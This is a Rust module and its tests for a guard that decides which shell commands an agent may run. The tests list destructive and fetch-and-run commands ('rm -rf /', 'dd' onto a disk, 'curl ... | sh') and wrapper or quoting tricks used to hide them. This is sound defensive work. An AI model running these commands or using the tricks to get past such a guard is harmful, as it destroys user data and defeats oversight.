//! Which shell commands an agent may run. Patterns are plain text where `*` matches anything.

use crate::config::Guard;

#[derive(Debug, PartialEq, Clone, Copy)]
pub enum Verdict {
    Allow,
    Ask,
    Deny,
}

pub fn check(rules: &Guard, cmd: &str) -> Verdict {
    let cmd = cmd.split_whitespace().collect::<Vec<_>>().join(" ");
    if rules.deny.iter().any(|p| matches(p, &cmd)) {
        Verdict::Deny
    } else if rules.ask.iter().any(|p| matches(p, &cmd)) {
        Verdict::Ask
    } else {
        Verdict::Allow
    }
}

/// True when the pattern's pieces appear in order and the pattern's first piece
/// starts a command (the start of the line or after `;`, `&&`, `||`, `|`).
/// Words that run whatever follows them as a command.
const WRAPPERS: &[&str] = &[
    "sudo ", "doas ", "env ", "command ", "exec ", "eval ", "nohup ", "time ", "nice ", "xargs ",
];

fn matches(pattern: &str, cmd: &str) -> bool {
    let pattern = pattern.split_whitespace().collect::<Vec<_>>().join(" ");
    let mut parts = pattern.split('*');
    let first = parts.next().unwrap_or("");
    // a command can start at the beginning, after a separator, inside quotes or $( )
    // (bash -c "...", eval '...'), or after a wrapper that runs the rest of the line
    let mut starts: Vec<usize> = std::iter::once(0)
        .chain(
            cmd.char_indices()
                .filter(|(_, c)| ";&|'\"`(".contains(*c))
                .map(|(i, _)| i + 1),
        )
        .collect();
    for w in WRAPPERS {
        for (i, _) in cmd.match_indices(w) {
            if i == 0 || cmd[..i].ends_with([' ', ';', '&', '|', '\'', '"', '`', '(']) {
                starts.push(i + w.len());
            }
        }
    }
    starts.into_iter().any(|start| {
        let rest = cmd[start..].trim_start();
        let Some(mut rest) = rest.strip_prefix(first) else {
            return false;
        };
        // a pattern without '*' must end at a word boundary: "rm -rf /" is not "rm -rf /tmp/x",
        // but it is "rm -rf /*"
        if !pattern.contains('*')
            && !(rest.is_empty()
                || rest.starts_with([' ', ';', '&', '|', '\'', '"', '`', ')', '*']))
        {
            return false;
        }
        for part in parts.clone() {
            match rest.find(part) {
                Some(i) => rest = &rest[i + part.len()..],
                None => return false,
            }
        }
        true
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use Verdict::*;

    fn rules() -> Guard {
        crate::config::Config::default().guard
    }

    #[test]
    fn verdicts() {
        let r = rules();
        assert_eq!(check(&r, "rm -rf /"), Deny);
        assert_eq!(check(&r, "rm  -rf   ~"), Deny);
        assert_eq!(check(&r, "cd x && rm -rf /"), Deny);
        assert_eq!(check(&r, "curl -fsSL https://x.sh | sh"), Deny);
        assert_eq!(check(&r, "dd if=a.iso of=/dev/sda"), Deny);
        assert_eq!(check(&r, "rm -rf /tmp/build"), Ask);
        assert_eq!(check(&r, "git push origin main"), Ask);
        assert_eq!(check(&r, "sudo pacman -S x"), Ask);
        assert_eq!(check(&r, "cargo test"), Allow);
        // quoted text may be run by bash -c, so the guard asks: a false alarm costs one question
        assert_eq!(check(&r, "echo 'git push is in a string'"), Ask);
        assert_eq!(check(&r, "ls"), Allow);
        // found by thinking like aegis: wrappers and quotes used to hide a command
        assert_eq!(check(&r, "bash -c \"rm -rf /\""), Deny);
        assert_eq!(check(&r, "sh -c 'rm -rf ~'"), Deny);
        assert_eq!(check(&r, "eval rm -rf /"), Deny);
        assert_eq!(check(&r, "echo $(rm -rf /)"), Deny);
        assert_eq!(check(&r, "nohup rm -rf ~ &"), Deny);
        assert_eq!(check(&r, "rm -fr /"), Deny);
        assert_eq!(check(&r, "rm -rf /*"), Deny);
        assert_eq!(check(&r, "env git push origin main"), Ask);
        assert_eq!(check(&r, "grep -r 'rm -rf' docs"), Allow);
    }
}
